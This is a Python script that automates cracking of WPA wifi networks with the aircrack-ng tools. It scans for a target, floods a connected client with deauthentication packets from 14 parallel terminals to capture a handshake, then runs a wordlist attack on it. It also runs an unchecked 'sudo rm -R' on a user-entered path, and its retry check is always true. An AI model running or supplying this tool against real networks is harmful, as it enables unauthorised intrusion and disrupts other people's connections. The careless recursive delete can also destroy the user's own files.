#AutomaticCRR is a command line software running under linux, its goal is to simplify the cracking of wifi networks. 
#This software has not been developed in any case to introduce wifi networks not belonging to you.
#I'm in any case responsable of your usage
#Developped by Nux 404


import os 
import time

aireplay = 0
os.system("clear")

print("I disclaim all responsibility for the use you make of my wifi cracking tool.")
time.sleep(1)
print("If your not connect in super user mode (sudo su) restart the program.")
time.sleep(1)

PATH = input("Enter the path to install files : ")

PATH_Validity = os.path.exists(PATH)

while PATH_Validity != True:
	PATH = input("Please enter a valid path : ")
	PATH_Validity = os.path.exists(PATH)

if not os.path.exists(f"{PATH}AutomaticCRR"):
	os.makedirs(f"{PATH}AutomaticCRR")

PATH = (f"{PATH}AutomaticCRR/")

os.system(f"cd {PATH}")
os.system(f"sudo rm -R {PATH}*")
os.system("clear")

os.system("airmon-ng")
INTERFACE = input("Enter the interface of your network card : ")
	
os.system(f"airmon-ng start {INTERFACE}")
os.system("clear")
os.system("airmon-ng")

INTERFACE_2 = input("Retape the interface of your network card : ")
os.system("clear")

os.system(f"gnome-terminal -- airodump-ng {INTERFACE_2}")

BSSID = input("Enter the BSSID to crack : ")
CHANNEL = input("Enter the CHANNEL of the network to crack : ")

os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
time.sleep(10)

STATION = input("Enter the STATION of the network to crack : ")
os.system("clear")

while aireplay != 14:
	aireplay = aireplay + 1
	os.system(f"gnome-terminal -- aireplay-ng --deauth  0 -a {BSSID} -c {STATION} {INTERFACE_2}")

print(f"When the sentence WPA HANDSHAKE FOUND: {BSSID} is displayed close the window(s) Sending 64 directed DeAuth.")
print("")
time.sleep(5)

PATH_LST = input("Enter the list directory to use for crack : ")
PATH_Validity = os.path.exists(PATH_LST)

while PATH_Validity != True:
	PATH_2 = input("Please enter a valid path : ")
	PATH_Validity = os.path.exists(PATH_2)
	PATH_LST = PATH_2

os.system(f"airmon-ng stop {INTERFACE_2}")
os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")

retry = input("Do you want to retry with an another list ? [y/n]")

if retry == "y" or "Y":
	os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
else:
	exit()